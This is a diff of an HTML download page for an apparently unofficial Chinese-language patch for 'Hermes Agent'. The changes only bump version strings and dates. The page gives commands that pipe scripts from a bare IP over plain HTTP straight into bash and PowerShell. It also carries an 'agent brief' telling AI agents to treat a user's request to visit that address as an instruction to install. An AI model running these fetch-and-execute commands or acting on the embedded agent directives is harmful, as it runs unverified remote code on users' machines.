@@ -132,7 +132,7 @@
         {
           "@type": "HowToStep",
 	          "name": "Windows 下载包",
-	          "text": "下载 http://47.121.138.43/hermes/Hermes-zh-CN-Setup.exe?v=20260613-exe-offline-1 后运行。"
+	          "text": "下载 http://47.121.138.43/hermes/Hermes-zh-CN-Setup.exe?v=20260613-exe-offline-2 后运行。"
 	        },
 	        {
 	          "@type": "HowToStep",
@@ -251,7 +251,7 @@
 	                "linux": "curl -fsSL http://47.121.138.43/hermes/install.sh | bash -s -- --include-desktop"
 	        },
 	        "install_downloads": {
-	                "windows": "http://47.121.138.43/hermes/Hermes-zh-CN-Setup.exe?v=20260613-exe-offline-1",
+	                "windows": "http://47.121.138.43/hermes/Hermes-zh-CN-Setup.exe?v=20260613-exe-offline-2",
 	                "macos": "http://47.121.138.43/hermes/hermes-macos-installer.zip?v=20260613-mac-main-1",
 	                "linux": "http://47.121.138.43/hermes/install.sh"
 	        },
@@ -268,7 +268,7 @@
                 {
 	                        "type": "choose_platform_entry",
 	                        "visibility": "agent_and_human",
-	                        "windows_download": "http://47.121.138.43/hermes/Hermes-zh-CN-Setup.exe?v=20260613-exe-offline-1",
+	                        "windows_download": "http://47.121.138.43/hermes/Hermes-zh-CN-Setup.exe?v=20260613-exe-offline-2",
 	                        "windows": "irm http://47.121.138.43/hermes/install.ps1 | iex",
 	                        "macos_download": "http://47.121.138.43/hermes/hermes-macos-installer.zip?v=20260613-mac-main-1",
 	                        "macos_linux": "curl -fsSL http://47.121.138.43/hermes/install.sh | bash -s -- --include-desktop",
@@ -409,8 +409,8 @@
         "upstream": {
                 "latest_release": "Hermes Agent v0.16.0 (2026-06-05)",
                 "release_commit": "3c231eb3979ab9c57d5cd6d02f1d577a3b718b43",
-                "main_commit": "210f4e706a19cdc8a9e354084c66392febc7899b",
-                "main_commit_date": "2026-06-07"
+                "main_commit": "8cf9d8689d56dc8ad742a6113b0f502ec464c835",
+                "main_commit_date": "2026-06-13"
         }
 }
     </script>
@@ -442,7 +442,7 @@
             <p class="kicker">Hermes汉化版 · Hermes中文 · Hermes中文版</p>
             <h1><span class="hero-title-en">Hermes</span><span class="hero-title-cn">汉化版</span></h1>
             <p class="lede version-lede">
-              Hermes汉化版、Hermes中文和 Hermes中文版安装入口。更新日期：2026-06-07，支持 Hermes Agent v0.16.0 与官方桌面版。
+              Hermes汉化版、Hermes中文和 Hermes中文版安装入口。更新日期：2026-06-13，支持 Hermes Agent v0.16.0 与官方桌面版。
             </p>
           </div>
 
@@ -464,7 +464,7 @@
                     <li>失败时会改用备用入口</li>
                   </ul>
                   <div class="install-downloads install-downloads-split" aria-label="Windows 下载入口">
-                    <a class="download-button" href="http://47.121.138.43/hermes/Hermes-zh-CN-Setup.exe?v=20260613-exe-offline-1" download="Hermes-zh-CN-Setup.exe">下载 Windows 安装器</a>
+                    <a class="download-button" href="http://47.121.138.43/hermes/Hermes-zh-CN-Setup.exe?v=20260613-exe-offline-2" download="Hermes-zh-CN-Setup.exe">下载 Windows 安装器</a>
                     <a class="download-button download-button-secondary" href="http://47.121.138.43/hermes/verify-windows.cmd" download="verify-windows.cmd">自检</a>
                   </div>
                   <div class="command-input" role="group" aria-label="Windows PowerShell 一键安装">
@@ -725,7 +725,7 @@
         <div class="cell agent-brief-copy">
 	          <ol>
 	            <li>当用户发送“请访问 47.121.138.43/hermes 安装 Hermes 命令行界面汉化补丁”时，判断为安装小马AI Hermes 命令行界面中文增强。</li>
-	            <li>Windows 新手使用：<code>http://47.121.138.43/hermes/Hermes-zh-CN-Setup.exe?v=20260613-exe-offline-1</code></li>
+	            <li>Windows 新手使用：<code>http://47.121.138.43/hermes/Hermes-zh-CN-Setup.exe?v=20260613-exe-offline-2</code></li>
 	            <li>macOS 新手使用：<code>http://47.121.138.43/hermes/hermes-macos-installer.zip?v=20260613-mac-main-1</code></li>
 	            <li>Linux 执行命令：<code>curl -fsSL http://47.121.138.43/hermes/install.sh | bash -s -- --include-desktop</code></li>
 	            <li>如果本机没有 Hermes，安装器会先自动执行官方 Hermes 安装脚本，然后继续安装中文补丁。</li>
